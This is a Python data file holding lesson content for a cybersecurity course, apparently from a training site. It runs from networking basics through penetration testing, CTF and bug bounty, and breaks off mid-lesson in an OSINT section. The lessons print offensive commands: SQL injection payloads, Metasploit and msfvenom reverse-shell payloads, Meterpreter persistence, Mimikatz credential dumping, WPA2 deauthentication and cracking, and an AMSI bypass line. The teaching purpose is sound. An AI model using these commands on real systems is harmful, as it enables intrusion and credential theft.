"""
Cybersecurity Learning Content - From Basic to Advanced
"""

LEARNING_MODULES = {
    "beginner": {
        "id": "beginner",
        "title": "🎯 Beginner Level",
        "description": "Start your cybersecurity journey with fundamental concepts",
        "icon": "🌱",
        "color": "#4CAF50",
        "lessons": [
            {
                "id": "intro-cybersecurity",
                "title": "Introduction to Cybersecurity",
                "duration": "15 min",
                "topics": [
                    "What is Cybersecurity?",
                    "CIA Triad (Confidentiality, Integrity, Availability)",
                    "Types of Cyber Threats",
                    "Career Paths in Cybersecurity"
                ],
                "content": """
                    <h3>What is Cybersecurity?</h3>
                    <p>Cybersecurity is the practice of protecting systems, networks, and programs from digital attacks. These attacks aim to access, change, or destroy sensitive information, extort money, or interrupt normal business processes.</p>
                    
                    <h3>The CIA Triad</h3>
                    <ul>
                        <li><strong>Confidentiality:</strong> Ensuring that information is accessible only to authorized individuals</li>
                        <li><strong>Integrity:</strong> Ensuring that information is accurate and hasn't been tampered with</li>
                        <li><strong>Availability:</strong> Ensuring that authorized users have access when needed</li>
                    </ul>
                    
                    <h3>Common Cyber Threats</h3>
                    <ul>
                        <li>Malware (viruses, trojans, ransomware)</li>
                        <li>Phishing attacks</li>
                        <li>Man-in-the-middle attacks</li>
                        <li>Denial of Service (DoS)</li>
                        <li>SQL Injection</li>
                    </ul>
                """
            },
            {
                "id": "networking-basics",
                "title": "Networking Fundamentals",
                "duration": "20 min",
                "topics": [
                    "OSI Model",
                    "TCP/IP Protocol Suite",
                    "IP Addressing and Subnetting",
                    "Common Network Protocols"
                ],
                "content": """
                    <h3>OSI Model (7 Layers)</h3>
                    <ol>
                        <li><strong>Physical</strong> - Hardware transmission</li>
                        <li><strong>Data Link</strong> - MAC addressing, switches</li>
                        <li><strong>Network</strong> - IP addressing, routing</li>
                        <li><strong>Transport</strong> - TCP/UDP, port numbers</li>
                        <li><strong>Session</strong> - Session management</li>
                        <li><strong>Presentation</strong> - Data encryption/decryption</li>
                        <li><strong>Application</strong> - User applications (HTTP, FTP, etc.)</li>
                    </ol>
                    
                    <h3>Common Ports to Know</h3>
                    <ul>
                        <li><code>21</code> - FTP</li>
                        <li><code>22</code> - SSH</li>
                        <li><code>80</code> - HTTP</li>
                        <li><code>443</code> - HTTPS</li>
                        <li><code>3306</code> - MySQL</li>
                        <li><code>3389</code> - RDP</li>
                    </ul>
                """
            },
            {
                "id": "linux-basics",
                "title": "Linux Command Line Basics",
                "duration": "25 min",
                "topics": [
                    "Essential Linux Commands",
                    "File System Navigation",
                    "File Permissions",
                    "User Management"
                ],
                "content": """
                    <h3>Essential Commands</h3>
                    <pre><code># Navigation
cd /path/to/directory
ls -la
pwd

# File Operations
cat file.txt
grep "search term" file.txt
find / -name "filename"
chmod 755 file.sh

# Network Commands
ifconfig / ip addr
netstat -tulpn
ping google.com
traceroute google.com

# System Information
uname -a
whoami
ps aux
top</code></pre>

                    <h3>File Permissions</h3>
                    <p>Linux uses a 3-digit octal permission system:</p>
                    <ul>
                        <li><strong>Read (r) = 4</strong></li>
                        <li><strong>Write (w) = 2</strong></li>
                        <li><strong>Execute (x) = 1</strong></li>
                    </ul>
                    <p>Example: <code>chmod 755</code> = rwxr-xr-x</p>
                """
            },
            {
                "id": "password-security",
                "title": "Password Security & Hashing",
                "duration": "15 min",
                "topics": [
                    "Password Best Practices",
                    "Hashing vs Encryption",
                    "Common Hash Types",
                    "Password Cracking Basics"
                ],
                "content": """
                    <h3>Password Best Practices</h3>
                    <ul>
                        <li>Use at least 12 characters</li>
                        <li>Mix uppercase, lowercase, numbers, and symbols</li>
                        <li>Avoid dictionary words and common patterns</li>
                        <li>Use unique passwords for different accounts</li>
                        <li>Enable two-factor authentication (2FA)</li>
                    </ul>
                    
                    <h3>Common Hash Types</h3>
                    <ul>
                        <li><strong>MD5</strong> - 32 characters (Insecure, legacy)</li>
                        <li><strong>SHA-1</strong> - 40 characters (Deprecated)</li>
                        <li><strong>SHA-256</strong> - 64 characters (Secure)</li>
                        <li><strong>bcrypt</strong> - Variable length (Recommended for passwords)</li>
                    </ul>
                """
            }
        ]
    },
    "intermediate": {
        "id": "intermediate",
        "title": "⚡ Intermediate Level",
        "description": "Dive deeper into penetration testing and security tools",
        "icon": "🔧",
        "color": "#FF9800",
        "lessons": [
            {
                "id": "reconnaissance",
                "title": "Reconnaissance & Information Gathering",
                "duration": "30 min",
                "topics": [
                    "Passive vs Active Reconnaissance",
                    "OSINT Techniques",
                    "DNS Enumeration",
                    "Subdomain Discovery"
                ],
                "content": """
                    <h3>Passive Reconnaissance</h3>
                    <p>Gathering information without directly interacting with the target:</p>
                    <ul>
                        <li><strong>WHOIS Lookup:</strong> <code>whois example.com</code></li>
                        <li><strong>DNS Records:</strong> <code>dig example.com</code></li>
                        <li><strong>Google Dorking:</strong> Advanced search operators</li>
                        <li><strong>Social Media OSINT</strong></li>
                        <li><strong>Archive.org</strong> - Historical website data</li>
                    </ul>
                    
                    <h3>Active Reconnaissance</h3>
                    <pre><code># DNS Enumeration
nslookup example.com
dig @8.8.8.8 example.com ANY

# Subdomain Discovery
sublist3r -d example.com
amass enum -d example.com

# Network Scanning
nmap -sn 192.168.1.0/24</code></pre>
                """
            },
            {
                "id": "nmap-scanning",
                "title": "Network Scanning with Nmap",
                "duration": "35 min",
                "topics": [
                    "Nmap Scan Types",
                    "Port Scanning Techniques",
                    "Service Detection",
                    "Firewall Evasion"
                ],
                "content": """
                    <h3>Common Nmap Scans</h3>
                    <pre><code># Basic Scans
nmap -sV -sC 192.168.1.1        # Version & default scripts
nmap -p- 192.168.1.1             # All ports
nmap -A 192.168.1.1              # Aggressive scan

# Stealth Techniques
nmap -sS 192.168.1.1             # SYN scan (stealth)
nmap -Pn 192.168.1.1             # Skip ping (firewall bypass)
nmap -f 192.168.1.1              # Fragment packets

# Service Detection
nmap -sV --version-intensity 9 192.168.1.1

# Save Output
nmap -oA scan_results 192.168.1.1</code></pre>
                    
                    <h3>Understanding Scan Results</h3>
                    <ul>
                        <li><strong>Open:</strong> Service is listening</li>
                        <li><strong>Closed:</strong> Port accessible but no service</li>
                        <li><strong>Filtered:</strong> Firewall blocking</li>
                        <li><strong>Open|Filtered:</strong> Cannot determine</li>
                    </ul>
                """
            },
            {
                "id": "web-vulnerabilities",
                "title": "Web Application Vulnerabilities",
                "duration": "40 min",
                "topics": [
                    "OWASP Top 10",
                    "SQL Injection",
                    "Cross-Site Scripting (XSS)",
                    "CSRF Attacks"
                ],
                "content": """
                    <h3>OWASP Top 10 (2021)</h3>
                    <ol>
                        <li>Broken Access Control</li>
                        <li>Cryptographic Failures</li>
                        <li>Injection</li>
                        <li>Insecure Design</li>
                        <li>Security Misconfiguration</li>
                        <li>Vulnerable Components</li>
                        <li>Authentication Failures</li>
                        <li>Software & Data Integrity Failures</li>
                        <li>Security Logging Failures</li>
                        <li>Server-Side Request Forgery (SSRF)</li>
                    </ol>
                    
                    <h3>SQL Injection Basics</h3>
                    <pre><code># Testing for SQLi
' OR '1'='1
' OR '1'='1' --
' UNION SELECT NULL--

# Common SQLi Techniques
1' ORDER BY 1--
1' UNION SELECT username, password FROM users--

# SQLMap Tool
sqlmap -u "http://target.com?id=1" --dbs
sqlmap -u "http://target.com?id=1" -D database --tables</code></pre>

                    <h3>XSS Attack Types</h3>
                    <ul>
                        <li><strong>Reflected XSS:</strong> Payload in URL/request</li>
                        <li><strong>Stored XSS:</strong> Payload saved in database</li>
                        <li><strong>DOM-based XSS:</strong> Client-side vulnerability</li>
                    </ul>
                """
            },
            {
                "id": "burp-suite",
                "title": "Web Application Testing with Burp Suite",
                "duration": "30 min",
                "topics": [
                    "Proxy Configuration",
                    "Intercepting Requests",
                    "Repeater & Intruder",
                    "Active Scanning"
                ],
                "content": """
                    <h3>Burp Suite Components</h3>
                    <ul>
                        <li><strong>Proxy:</strong> Intercept and modify HTTP/S traffic</li>
                        <li><strong>Repeater:</strong> Manually test individual requests</li>
                        <li><strong>Intruder:</strong> Automated payload injection</li>
                        <li><strong>Scanner:</strong> Automated vulnerability detection (Pro)</li>
                        <li><strong>Decoder:</strong> Encode/decode data</li>
                    </ul>
                    
                    <h3>Common Workflow</h3>
                    <ol>
                        <li>Configure browser to use Burp proxy (127.0.0.1:8080)</li>
                        <li>Navigate target application</li>
                        <li>Analyze HTTP history</li>
                        <li>Send interesting requests to Repeater</li>
                        <li>Modify and test payloads</li>
                        <li>Use Intruder for fuzzing</li>
                    </ol>
                """
            },
            {
                "id": "metasploit-basics",
                "title": "Exploitation with Metasploit",
                "duration": "35 min",
                "topics": [
                    "Metasploit Framework",
                    "Searching for Exploits",
                    "Using Modules",
                    "Meterpreter Sessions"
                ],
                "content": """
                    <h3>Metasploit Basics</h3>
                    <pre><code># Start Metasploit
msfconsole

# Search for exploits
search cve:2021
search type:exploit platform:windows

# Use a module
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 192.168.1.100
set LHOST 192.168.1.50
exploit

# Useful Commands
back                 # Exit current module
sessions -l          # List active sessions
sessions -i 1        # Interact with session</code></pre>

                    <h3>Meterpreter Commands</h3>
                    <pre><code># System Info
sysinfo
getuid

# File Operations
download C:\\passwords.txt
upload backdoor.exe C:\\Windows\\Temp

# Privilege Escalation
getsystem

# Persistence
run persistence -X</code></pre>
                """
            }
        ]
    },
    "advanced": {
        "id": "advanced",
        "title": "🚀 Advanced Level",
        "description": "Master advanced exploitation and defense techniques",
        "icon": "🎖️",
        "color": "#F44336",
        "lessons": [
            {
                "id": "buffer-overflow",
                "title": "Buffer Overflow Exploitation",
                "duration": "45 min",
                "topics": [
                    "Stack-Based Buffer Overflows",
                    "Shellcode Development",
                    "DEP and ASLR Bypass",
                    "Return-Oriented Programming (ROP)"
                ],
                "content": """
                    <h3>Understanding Buffer Overflows</h3>
                    <p>A buffer overflow occurs when data written to a buffer exceeds its allocated memory, overwriting adjacent memory locations.</p>
                    
                    <h3>Exploitation Steps</h3>
                    <ol>
                        <li><strong>Fuzzing:</strong> Find the crash point</li>
                        <li><strong>Control EIP:</strong> Identify offset to overwrite instruction pointer</li>
                        <li><strong>Find Bad Characters:</strong> Identify characters that break the exploit</li>
                        <li><strong>Find JMP ESP:</strong> Locate a valid jump instruction</li>
                        <li><strong>Generate Shellcode:</strong> Create payload</li>
                        <li><strong>Exploit:</strong> Execute the attack</li>
                    </ol>
                    
                    <h3>Basic Shellcode Example</h3>
                    <pre><code># Generate shellcode with msfvenom
msfvenom -p windows/shell_reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -b "\\x00\\x0a\\x0d" \\
  -f python

# Find pattern offset
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 386F4337</code></pre>
                """
            },
            {
                "id": "active-directory",
                "title": "Active Directory Exploitation",
                "duration": "50 min",
                "topics": [
                    "AD Enumeration",
                    "Kerberoasting",
                    "Pass-the-Hash",
                    "Golden Ticket Attacks"
                ],
                "content": """
                    <h3>AD Enumeration</h3>
                    <pre><code># PowerView Enumeration
Import-Module .\\PowerView.ps1
Get-NetDomain
Get-NetDomainController
Get-NetUser
Get-NetGroup -GroupName "Domain Admins"

# BloodHound Data Collection
SharpHound.exe -c All
neo4j start
bloodhound</code></pre>

                    <h3>Credential Attacks</h3>
                    <pre><code># Kerberoasting
Get-NetUser -SPN
Request-SPNTicket -SPN "MSSQLSvc/sql01.domain.local"
hashcat -m 13100 tickets.txt wordlist.txt

# Pass-the-Hash
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:[hash]

# Mimikatz
privilege::debug
sekurlsa::logonpasswords
lsadump::sam</code></pre>

                    <h3>Lateral Movement</h3>
                    <pre><code># PsExec
psexec.py domain/user:password@192.168.1.100

# WMI
wmic /node:192.168.1.100 /user:admin process call create "cmd.exe"

# WinRM
evil-winrm -i 192.168.1.100 -u Administrator -p 'password'</code></pre>
                """
            },
            {
                "id": "privilege-escalation",
                "title": "Privilege Escalation Techniques",
                "duration": "40 min",
                "topics": [
                    "Linux Privilege Escalation",
                    "Windows Privilege Escalation",
                    "Kernel Exploits",
                    "Misconfiguration Exploitation"
                ],
                "content": """
                    <h3>Linux PrivEsc Checklist</h3>
                    <pre><code># System Enumeration
uname -a
cat /etc/issue
cat /etc/*-release

# User & Group Info
id
sudo -l
cat /etc/passwd | grep -v nologin

# SUID Files
find / -perm -4000 -type f 2>/dev/null

# Writable Directories
find / -writable -type d 2>/dev/null

# Cron Jobs
cat /etc/crontab
crontab -l

# Automated Tools
./linpeas.sh
./linux-exploit-suggester.sh</code></pre>

                    <h3>Windows PrivEsc Techniques</h3>
                    <pre><code># System Info
systeminfo
whoami /priv
net user
net localgroup administrators

# Service Misconfigurations
sc query
accesschk.exe -uwcqv "Authenticated Users" *

# Registry AutoRun
reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

# Unquoted Service Paths
wmic service get name,pathname | findstr /i /v "C:\\Windows"

# PowerUp (PowerSploit)
powershell -ep bypass
Import-Module .\\PowerUp.ps1
Invoke-AllChecks</code></pre>
                """
            },
            {
                "id": "wireless-security",
                "title": "Wireless Network Security",
                "duration": "35 min",
                "topics": [
                    "WiFi Encryption Protocols",
                    "WPA/WPA2 Cracking",
                    "Evil Twin Attacks",
                    "Bluetooth Security"
                ],
                "content": """
                    <h3>WiFi Security Protocols</h3>
                    <ul>
                        <li><strong>WEP:</strong> Deprecated, easily crackable</li>
                        <li><strong>WPA:</strong> Vulnerable to attack</li>
                        <li><strong>WPA2:</strong> Current standard, uses AES</li>
                        <li><strong>WPA3:</strong> Latest, improved security</li>
                    </ul>
                    
                    <h3>WPA2 Cracking Workflow</h3>
                    <pre><code># Put interface in monitor mode
airmon-ng start wlan0

# Scan for networks
airodump-ng wlan0mon

# Capture handshake
airodump-ng -c 6 --bssid [AP_MAC] -w capture wlan0mon

# Deauth to force handshake
aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon

# Crack with hashcat
hashcat -m 22000 capture.hc22000 wordlist.txt

# Or use aircrack-ng
aircrack-ng -w wordlist.txt -b [AP_MAC] capture.cap</code></pre>

                    <h3>Evil Twin Attack</h3>
                    <pre><code># Create fake AP
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Set up DHCP server
# Capture credentials with captive portal</code></pre>
                """
            },
            {
                "id": "red-team-ops",
                "title": "Red Team Operations",
                "duration": "55 min",
                "topics": [
                    "Command & Control (C2)",
                    "Evasion Techniques",
                    "Social Engineering",
                    "Post-Exploitation"
                ],
                "content": """
                    <h3>C2 Frameworks</h3>
                    <ul>
                        <li><strong>Cobalt Strike:</strong> Professional red team tool</li>
                        <li><strong>Covenant:</strong> .NET C2 framework</li>
                        <li><strong>Empire/Starkiller:</strong> PowerShell & Python</li>
                        <li><strong>Merlin:</strong> Go-based C2</li>
                    </ul>
                    
                    <h3>Evasion Techniques</h3>
                    <pre><code># Obfuscate PowerShell
Invoke-Obfuscation

# Encode payload
msfvenom -p windows/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -e x86/shikata_ga_nai -i 10 \\
  -f exe > payload.exe

# Process Injection
Invoke-ReflectivePEInjection

# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)</code></pre>

                    <h3>Persistence Mechanisms</h3>
                    <ul>
                        <li>Registry Run Keys</li>
                        <li>Scheduled Tasks</li>
                        <li>WMI Event Subscriptions</li>
                        <li>Service Creation</li>
                        <li>DLL Hijacking</li>
                    </ul>
                """
            },
            {
                "id": "threat-hunting",
                "title": "Threat Hunting & Detection",
                "duration": "40 min",
                "topics": [
                    "Log Analysis",
                    "SIEM Configuration",
                    "Indicators of Compromise (IOCs)",
                    "Incident Response"
                ],
                "content": """
                    <h3>Log Sources</h3>
                    <ul>
                        <li><strong>Windows:</strong> Event Viewer, Sysmon</li>
                        <li><strong>Linux:</strong> /var/log/, journalctl</li>
                        <li><strong>Network:</strong> Firewall logs, IDS/IPS</li>
                        <li><strong>Application:</strong> Web server logs</li>
                    </ul>
                    
                    <h3>Sysmon Configuration</h3>
                    <pre><code># Install Sysmon
sysmon -accepteula -i sysmonconfig.xml

# Key Event IDs
Event ID 1  - Process Creation
Event ID 3  - Network Connection
Event ID 7  - Image Loaded
Event ID 10 - Process Access
Event ID 11 - File Created</code></pre>

                    <h3>MITRE ATT&CK Framework</h3>
                    <p>Map adversary tactics and techniques:</p>
                    <ul>
                        <li><strong>Initial Access</strong></li>
                        <li><strong>Execution</strong></li>
                        <li><strong>Persistence</strong></li>
                        <li><strong>Privilege Escalation</strong></li>
                        <li><strong>Defense Evasion</strong></li>
                        <li><strong>Credential Access</strong></li>
                        <li><strong>Discovery</strong></li>
                        <li><strong>Lateral Movement</strong></li>
                        <li><strong>Collection</strong></li>
                        <li><strong>Exfiltration</strong></li>
                        <li><strong>Command & Control</strong></li>
                    </ul>
                """
            }
        ]
    },
    "ctf": {
        "id": "ctf",
        "title": "🏁 CTF Training",
        "description": "Master Capture The Flag competitions and sharpen your hacking skills",
        "icon": "🚩",
        "color": "#9C27B0",
        "lessons": [
            {
                "id": "ctf-introduction",
                "title": "Introduction to CTF",
                "duration": "20 min",
                "topics": [
                    "What is CTF?",
                    "Types of CTF Competitions",
                    "Essential Tools",
                    "Getting Started"
                ],
                "content": """
                    <h3>What is CTF (Capture The Flag)?</h3>
                    <p>CTF is a cybersecurity competition where you solve challenges to find hidden flags - secret strings that prove you solved the challenge (e.g., <code>flag{you_found_it!}</code>).</p>
                    
                    <h3>Types of CTF</h3>
                    <ul>
                        <li><strong>Jeopardy:</strong> Challenges in categories (Web, Crypto, Forensics) - Best for beginners</li>
                        <li><strong>Attack-Defense:</strong> Attack opponents while defending your own servers</li>
                        <li><strong>Boot2Root:</strong> Hack into a full machine (HackTheBox, TryHackMe)</li>
                    </ul>
                    
                    <h3>CTF Categories</h3>
                    <ul>
                        <li><strong>Web:</strong> SQL Injection, XSS, SSRF, Authentication Bypass</li>
                        <li><strong>Pwn/Binary:</strong> Buffer Overflow, ROP, Shellcode</li>
                        <li><strong>Crypto:</strong> RSA attacks, AES, Encoding/Decoding</li>
                        <li><strong>Forensics:</strong> File Analysis, Memory Dumps, Steganography</li>
                        <li><strong>Reverse Engineering:</strong> Disassembly, Debugging, Malware</li>
                        <li><strong>OSINT:</strong> Open Source Intelligence gathering</li>
                    </ul>
                    
                    <h3>Essential Tools</h3>
                    <pre><code>Burp Suite      - Web testing
Ghidra/IDA      - Reverse engineering
Wireshark       - Packet analysis
CyberChef       - Encoding/decoding
Binwalk         - File analysis
Python          - Scripting</code></pre>
                """
            },
            {
                "id": "ctf-web",
                "title": "Web Exploitation",
                "duration": "35 min",
                "topics": [
                    "SQL Injection",
                    "XSS Attacks",
                    "Authentication Bypass",
                    "Server-Side Attacks"
                ],
                "content": """
                    <h3>SQL Injection</h3>
                    <pre><code># Authentication Bypass
' OR '1'='1' --
admin'--

# UNION Injection
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

# Blind SQLi
' AND SLEEP(5)--</code></pre>
                    
                    <h3>Server-Side Template Injection</h3>
                    <pre><code># Jinja2 (Flask)
{{7*7}}
{{config.items()}}

# Test for SSTI
{{7*'7'}}</code></pre>
                    
                    <h3>Local File Inclusion</h3>
                    <pre><code>?page=../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php</code></pre>
                    
                    <h3>Tips</h3>
                    <ul>
                        <li>Check robots.txt, .git folders, backup files</li>
                        <li>Use Burp Suite to intercept every request</li>
                        <li>View HTML source and JavaScript files</li>
                    </ul>
                """
            },
            {
                "id": "ctf-crypto",
                "title": "Cryptography Basics",
                "duration": "30 min",
                "topics": [
                    "Encoding vs Encryption",
                    "Classical Ciphers",
                    "RSA Basics",
                    "Hash Cracking"
                ],
                "content": """
                    <h3>Common Encodings</h3>
                    <pre><code># Base64
echo "SGVsbG8=" | base64 -d

# Hex
echo "48656c6c6f" | xxd -r -p

# ROT13
echo "Uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></pre>
                    
                    <h3>Classical Ciphers</h3>
                    <ul>
                        <li><strong>Caesar:</strong> Shift letters by N positions</li>
                        <li><strong>Vigenère:</strong> Caesar with repeating keyword</li>
                        <li><strong>XOR:</strong> XOR plaintext with key</li>
                    </ul>
                    
                    <h3>RSA Attacks</h3>
                    <pre><code># Small e attack
# Factorization (factordb.com)
# Wiener's attack for small d

# Basic RSA
d = pow(e, -1, (p-1)*(q-1))
m = pow(c, d, n)</code></pre>
                    
                    <h3>Hash Cracking</h3>
                    <pre><code>hashcat -m 0 hash.txt wordlist.txt    # MD5
hashcat -m 100 hash.txt wordlist.txt  # SHA1
john --wordlist=rockyou.txt hashes.txt</code></pre>
                """
            },
            {
                "id": "ctf-forensics",
                "title": "Digital Forensics",
                "duration": "35 min",
                "topics": [
                    "File Analysis",
                    "Steganography",
                    "Memory Forensics",
                    "Network Analysis"
                ],
                "content": """
                    <h3>File Analysis</h3>
                    <pre><code>file mystery_file
exiftool image.jpg
strings file.exe
binwalk -e file.png
xxd file | head</code></pre>
                    
                    <h3>Steganography</h3>
                    <pre><code># Image steganography
steghide extract -sf image.jpg
zsteg image.png

# Check metadata
exiftool -all image.jpg

# Audio - Use Audacity spectrogram</code></pre>
                    
                    <h3>Memory Forensics (Volatility)</h3>
                    <pre><code>volatility -f mem.dump imageinfo
volatility -f mem.dump --profile=Win7SP1x64 pslist
volatility -f mem.dump --profile=Win7SP1x64 hashdump</code></pre>
                    
                    <h3>Wireshark Filters</h3>
                    <pre><code>http.request.method == "POST"
ip.addr == 192.168.1.1
tcp contains "password"</code></pre>
                """
            },
            {
                "id": "ctf-reverse",
                "title": "Reverse Engineering",
                "duration": "40 min",
                "topics": [
                    "Static Analysis",
                    "Dynamic Analysis",
                    "Common Patterns",
                    "Debugging"
                ],
                "content": """
                    <h3>Tools</h3>
                    <ul>
                        <li><strong>Ghidra:</strong> Free disassembler by NSA</li>
                        <li><strong>IDA Free:</strong> Industry standard</li>
                        <li><strong>GDB + pwndbg:</strong> Dynamic analysis</li>
                    </ul>
                    
                    <h3>Static Analysis</h3>
                    <pre><code>file binary
strings binary | grep flag
objdump -d binary</code></pre>
                    
                    <h3>GDB Commands</h3>
                    <pre><code>gdb ./binary
break main
run
step
x/s $rdi
info registers</code></pre>
                    
                    <h3>Common Patterns</h3>
                    <pre><code># Look for:
- strcmp, strncmp (string comparison)
- XOR operations
- Hardcoded strings
- Anti-debugging checks</code></pre>
                """
            },
            {
                "id": "ctf-practice",
                "title": "Practice Resources",
                "duration": "15 min",
                "topics": [
                    "Practice Platforms",
                    "Learning Path",
                    "Competition Tips",
                    "Useful Links"
                ],
                "content": """
                    <h3>Practice Platforms</h3>
                    <ul>
                        <li><strong>PicoCTF:</strong> Best for beginners (free)</li>
                        <li><strong>TryHackMe:</strong> Guided learning paths</li>
                        <li><strong>HackTheBox:</strong> Real-world machines</li>
                        <li><strong>OverTheWire:</strong> Linux/crypto basics</li>
                        <li><strong>CryptoHack:</strong> Cryptography focus</li>
                    </ul>
                    
                    <h3>30-Day Beginner Plan</h3>
                    <pre><code>Week 1: OverTheWire Bandit
Week 2: PicoCTF challenges
Week 3: TryHackMe paths
Week 4: First live CTF!</code></pre>
                    
                    <h3>Competition Tips</h3>
                    <ul>
                        <li>Start with easy challenges for momentum</li>
                        <li>Take detailed notes</li>
                        <li>Don't stay stuck - try another challenge</li>
                        <li>Read writeups after competition</li>
                        <li>Build a personal toolkit</li>
                    </ul>
                    
                    <h3>Resources</h3>
                    <ul>
                        <li><a href="https://ctftime.org" target="_blank">CTFTime.org</a> - CTF calendar</li>
                        <li><a href="https://ctf101.org" target="_blank">CTF101</a> - Learning guide</li>
                    </ul>
                """
            }
        ]
    },
    "bugbounty": {
        "id": "bugbounty",
        "title": "💰 Bug Bounty",
        "description": "Learn to hunt vulnerabilities in real-world applications for rewards",
        "icon": "🎯",
        "color": "#FF5722",
        "lessons": [
            {
                "id": "bb-intro",
                "title": "Bug Bounty Basics",
                "duration": "25 min",
                "topics": [
                    "What is Bug Bounty?",
                    "Bug Bounty Platforms",
                    "Rules of Engagement",
                    "Getting Started"
                ],
                "content": """
                    <h3>What is Bug Bounty?</h3>
                    <p>Bug bounty programs pay security researchers for finding and responsibly disclosing vulnerabilities in applications and systems.</p>
                    
                    <h3>Popular Platforms</h3>
                    <ul>
                        <li><strong>HackerOne:</strong> Largest platform, beginner-friendly</li>
                        <li><strong>Bugcrowd:</strong> Great for starting out</li>
                        <li><strong>Intigriti:</strong> European platform</li>
                        <li><strong>Synack:</strong> Invite-only, higher payouts</li>
                        <li><strong>YesWeHack:</strong> Growing platform</li>
                    </ul>
                    
                    <h3>Rules</h3>
                    <ul>
                        <li>Always read the program scope carefully</li>
                        <li>Only test on in-scope assets</li>
                        <li>Don't access other users' data</li>
                        <li>Report vulnerabilities responsibly</li>
                        <li>Don't disclose publicly without permission</li>
                    </ul>
                    
                    <h3>Typical Rewards</h3>
                    <pre><code>Low Severity:      $50 - $500
Medium Severity:   $500 - $2,000
High Severity:     $2,000 - $10,000
Critical:          $10,000 - $100,000+</code></pre>
                """
            },
            {
                "id": "bb-recon",
                "title": "Reconnaissance",
                "duration": "35 min",
                "topics": [
                    "Subdomain Enumeration",
                    "Port Scanning",
                    "Technology Detection",
                    "Content Discovery"
                ],
                "content": """
                    <h3>Subdomain Enumeration</h3>
                    <pre><code># Subfinder
subfinder -d target.com -o subs.txt

# Amass
amass enum -d target.com

# Assetfinder
assetfinder target.com | tee assets.txt

# crt.sh (Certificate Transparency)
curl "https://crt.sh/?q=%25.target.com" | grep target.com</code></pre>
                    
                    <h3>Technology Detection</h3>
                    <pre><code># Wappalyzer (browser extension)
# WhatWeb
whatweb https://target.com

# httpx for probing
cat subs.txt | httpx -title -tech-detect -status-code</code></pre>
                    
                    <h3>Content Discovery</h3>
                    <pre><code># Dirsearch
dirsearch -u https://target.com

# ffuf (faster)
ffuf -u https://target.com/FUZZ -w wordlist.txt

# Check for sensitive files
/robots.txt
/.git/HEAD
/.env
/backup.zip
/admin/</code></pre>
                """
            },
            {
                "id": "bb-vulns",
                "title": "Common Vulnerabilities",
                "duration": "40 min",
                "topics": [
                    "IDOR",
                    "Business Logic Flaws",
                    "Authentication Bypass",
                    "Information Disclosure"
                ],
                "content": """
                    <h3>IDOR (Insecure Direct Object Reference)</h3>
                    <pre><code># Change IDs in URLs
/api/user/123 → /api/user/124

# Change IDs in POST body
{"user_id": 123} → {"user_id": 124}

# Try encoded IDs
Base64, UUID, hashed values</code></pre>
                    
                    <h3>Business Logic Flaws</h3>
                    <ul>
                        <li>Price manipulation in carts</li>
                        <li>Bypassing payment workflows</li>
                        <li>Rate limit bypasses</li>
                        <li>Coupon code abuse</li>
                        <li>Password reset flaws</li>
                    </ul>
                    
                    <h3>Information Disclosure</h3>
                    <pre><code># Check for exposed data
- API keys in JavaScript
- Debug endpoints
- Stack traces in errors
- .git directories
- Swagger/OpenAPI docs
- GraphQL introspection</code></pre>
                    
                    <h3>Finding Hidden Endpoints</h3>
                    <pre><code># Check JavaScript files
# Use tools like LinkFinder
python3 linkfinder.py -i https://target.com -o output.html

# Wayback Machine
waybackurls target.com | grep -E "api|admin|internal"</code></pre>
                """
            },
            {
                "id": "bb-reports",
                "title": "Writing Reports",
                "duration": "20 min",
                "topics": [
                    "Report Structure",
                    "Proof of Concept",
                    "Impact Assessment",
                    "Communication Tips"
                ],
                "content": """
                    <h3>Good Report Structure</h3>
                    <pre><code>1. Title: [Vulnerability Type] in [Feature]
2. Summary: Brief description
3. Severity: Critical/High/Medium/Low
4. Steps to Reproduce:
   - Step 1
   - Step 2
   - Step 3
5. Proof of Concept: Screenshots/Videos
6. Impact: What can attacker do?
7. Remediation: How to fix</code></pre>
                    
                    <h3>Tips for Success</h3>
                    <ul>
                        <li>Be clear and concise</li>
                        <li>Provide reproducible steps</li>
                        <li>Include screenshots/videos</li>
                        <li>Explain the real-world impact</li>
                        <li>Be professional and patient</li>
                        <li>Don't argue about severity</li>
                    </ul>
                    
                    <h3>Common Mistakes</h3>
                    <ul>
                        <li>Reporting out-of-scope issues</li>
                        <li>Submitting duplicates</li>
                        <li>Poor write-ups</li>
                        <li>Overestimating severity</li>
                    </ul>
                """
            }
        ]
    },
    "osint": {
        "id": "osint",
        "title": "🔍 OSINT",
        "description": "Open Source Intelligence gathering techniques for investigations",
        "icon": "🕵️",
        "color": "#607D8B",
        "lessons": [
            {
                "id": "osint-intro",
                "title": "OSINT Fundamentals",
                "duration": "20 min",
                "topics": [
                    "What is OSINT?",
                    "OSINT Framework",
                    "Legal Considerations",
                    "Common Tools"
                ],
                "content": """
                    <h3>What is OSINT?</h3>
                    <p>Open Source Intelligence is information gathered from publicly available sources - websites, social media, public records, etc.</p>
                    
                    <h3>Use Cases</h3>
                    <ul>
                        <li>Security assessments</li>
                        <li>CTF competitions</li>
                        <li>Journalism investigations</li>
                        <li>Background checks</li>
                        <li>Threat intelligence</li>
                    </ul>
                    
                    <h3>Key Resources</h3>
                    <ul>
                        <li><a href="https://osintframework.com" target="_blank">OSINT Framework</a></li>
                        <li><a href="https://start.me/p/DPYPMz/the-ultimate-osint-collection" target="_blank">Ultimate OSINT Collection</a></li>
                    </ul>
                    
                    <h3>Legal Reminder</h3>
                    <p>Only gather publicly available information. Don't hack, don't access private accounts, and respect privacy laws.</p>
                """
            },
            {
                "id": "osint-people",
                "title": "People Search",
                "duration": "25 min",
                "topics": [
                    "Username Research",
                    "Email Investigation",
                    "Social Media",
                    "Reverse Image Search"
                ],
